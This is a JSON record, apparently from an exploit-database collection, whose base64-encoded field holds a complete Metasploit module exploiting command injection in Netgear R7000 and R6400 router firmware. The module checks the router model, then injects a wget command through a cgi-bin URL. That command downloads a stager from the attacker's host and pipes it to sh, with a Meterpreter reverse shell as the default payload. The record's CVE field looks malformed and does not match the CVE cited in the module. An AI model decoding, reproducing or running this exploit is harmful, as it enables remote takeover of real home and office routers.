{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoNCiAgUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpDbWRTdGFnZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgICAgICAgPT4gIk5ldGdlYXIgUjcwMDAgYW5kIFI2NDAwIGNnaS1iaW4gQ29tbWFuZCBJbmplY3Rpb24iLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICAgICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYW4gYXJiaXRyYXJ5IGNvbW1hbmQgaW5qZWN0aW9uIHZ1bG5lcmFiaWxpdHkgaW4NCiAgICAgICAgTmV0Z2VhciBSNzAwMCBhbmQgUjY0MDAgcm91dGVyIGZpcm13YXJlIHZlcnNpb24gMS4wLjcuMl8xLjEuOTMgYW5kIHBvc3NpYmx5IGVhcmxpZXIuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgICAgICAgPT4gJ2xpbnV4JywNCiAgICAgICdBdXRob3InICAgICAgICAgICAgICAgPT4gWyd0aGVjYXJ0ZXJiJywgJ0FjZXcwcm0nXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgICAgICAgPT4gMCwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgICAgICAgPT4gdHJ1ZSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgICAgICAgPT4gQVJDSF9BUk1MRSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgICAgICAgPT4gWw0KICAgICAgICBbICdBdXRvbWF0aWMgVGFyZ2V0JywgeyB9IF0NCiAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdFREInLCAnNDA4ODknXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2xhYnMuaWRlZmVuc2UuY29tL2ludGVsbGlnZW5jZS92dWxuZXJhYmlsaXRpZXMvZGlzcGxheS5waHA/aWQ9MzA1J10sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vd3d3LmtiLmNlcnQub3JnL3Z1bHMvaWQvNTgyMzg0J10sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwMzYzODYvQ1ZFLTIwMTYtNTgyMzg0J10sDQogICAgICAgICAgWyAnQ1ZFJywgJzIwMTYtNjI3NyddDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdEZWMgMDYgMjAxNicsDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1BBWUxPQUQnID0+ICdsaW51eC9hcm1sZS9tZXR0bGVfcmV2ZXJzZV90Y3AnDQogICAgICAgIH0NCiAgICApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0OjpSUE9SVCg4MCkNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQoNCiAgICBkZXJlZ2lzdGVyX29wdGlvbnMoJ1VSSVBBVEgnKQ0KICBlbmQNCg0KICBkZWYgc2NyYXBlKHRleHQsIHN0YXJ0X3RyaWcsIGVuZF90cmlnKQ0KICAgIHRleHRbLyN7c3RhcnRfdHJpZ30oLio/KSN7ZW5kX3RyaWd9L20sIDFdDQogIGVuZA0KDQogICMgUmVxdWVzdHMgdGhlIGxvZ2luIHBhZ2Ugd2hpY2ggZGlzY2xvc2VzIHRoZSBoYXJkd2FyZSwgaWYgaXQncyBhbiBSNzAwMCBvciBSNjQwMCwgcmV0dXJuIERldGVjdGVkDQogIGRlZiBjaGVjaw0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koeyd1cmknPT4nLyd9KQ0KICAgIGlmIHJlcy5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5yZWFjaGFibGUsICdDb25uZWN0aW9uIHRpbWVkIG91dC4nKQ0KICAgIGVuZA0KICAgICAjIENoZWNrcyBmb3IgdGhlIGBXV1ctQXV0aGVudGljYXRlYCBoZWFkZXIgaW4gdGhlIHJlc3BvbnNlDQogICAgaWYgcmVzLmhlYWRlcnNbIldXVy1BdXRoZW50aWNhdGUiXQ0KICAgICAgZGF0YSA9IHJlcy50b19zDQogICAgICBtYXJrZXJfb25lID0gIkJhc2ljIHJlYWxtPVwiTkVUR0VBUiAiDQogICAgICBtYXJrZXJfdHdvID0gIlwiIg0KICAgICAgbW9kZWwgPSBzY3JhcGUoZGF0YSwgbWFya2VyX29uZSwgbWFya2VyX3R3bykNCiAgICAgIHZwcmludF9zdGF0dXMoIlJvdXRlciBpcyBhIE5FVEdFQVIgcm91dGVyICgje21vZGVsfSkiKQ0KICAgICAgaWYgbW9kZWwgPT0gJ1I3MDAwJyB8fCBtb2RlbCA9PSAnUjY0MDAnDQogICAgICAgIHByaW50X2dvb2QoIlJvdXRlciBtYXkgYmUgdnVsbmVyYWJsZSAoTkVUR0VBUiAje21vZGVsfSkiKQ0KICAgICAgICByZXR1cm4gQ2hlY2tDb2RlOjpEZXRlY3RlZA0KICAgICAgZWxzZQ0KICAgICAgICByZXR1cm4gQ2hlY2tDb2RlOjpTYWZlDQogICAgICBlbmQNCiAgICBlbHNlDQogICAgICBwcmludF9lcnJvcignUm91dGVyIGlzIG5vdCBhIE5FVEdFQVIgcm91dGVyJykNCiAgICAgIHJldHVybiBDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICByZXR1cm4gaWYgY2hlY2sgPT0gQ2hlY2tDb2RlOjpTYWZlDQoNCiAgICBAY21kc3RhZ2VyID0gZ2VuZXJhdGVfY21kc3RhZ2VyKGZsYXZvcjogOndnZXQsICdQYXRoJyA9PiAnLycpLmpvaW4oJzsnKQ0KDQogICAgc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgICdtZXRob2QnID0+ICdHRVQnLA0KICAgICAgJ3VyaScgICAgPT4gIi9jZ2ktYmluLzt3Z2V0JElGUy1PLSRJRlMnI3tzcnZob3N0X2FkZHJ9OiN7c3J2cG9ydH0nfHNoIg0KICAgICkNCiAgZW5kDQoNCiAgIyBSZXR1cm4gQ21kU3RhZ2VyIG9uIGZpcnN0IHJlcXVlc3QsIHBheWxvYWQgb24gc2Vjb25kDQogIGRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcXVlc3QpDQogICAgaWYgQGNtZHN0YWdlcg0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBjbWRzdGFnZXIpDQogICAgICBAY21kc3RhZ2VyID0gbmlsDQogICAgZWxzZQ0KICAgICAgc3VwZXINCiAgICBlbmQNCiAgZW5kDQoNCmVuZA==", 
    "filename": "platforms/cgi/remote/41598.rb", 
    "id": "41598", 
    "cves": [
        "CVE-2016-582384"
    ]
}